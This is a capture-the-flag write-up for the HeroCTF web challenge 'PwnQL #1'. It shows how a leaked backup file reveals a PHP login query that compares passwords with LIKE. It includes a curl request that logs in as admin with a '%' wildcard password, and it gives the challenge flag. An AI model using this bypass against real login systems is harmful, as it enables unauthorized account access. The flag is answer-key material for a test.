# PwnQL #1

### Category

Web

### Description

Login as *admin* to get the flag.

URL : http://chall1.heroctf.fr:8080

Format : **Hero{flag}**<br>
Author : **xanhacks**

### Write up

After looking at the source code of the page, we can find a hint about a file named **login.php.bak**.

```html
<!-- Hello dev, do not forget to remove login.php.bak before committing your code. -->
```

We can download this file ! Let's look at this content.

```php
$sql = "SELECT * FROM users WHERE username = :username AND password LIKE :password;";
$sth = $db->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
$sth->execute(array(':username' => $username, ':password' => $password));
$users = $sth->fetchAll();
```

The query is prepared, so we cannot do a SQL injection but the query itself is vulnerable. The *LIKE* function is used, so the percentage (%) will match any string of zero or more characters (any passwords).

```
username : admin
password : %

$ curl -s -X POST "http://localhost:8080/" -d "username=admin&password=%" | grep "Hero{"
    <label style='color: white;'>Welcome back admin ! Here is your flag : Hero{pwnQL_b4sic_0ne_129835}</label><br> 
```

### Flag

Hero{pwnQL_b4sic_0ne_129835}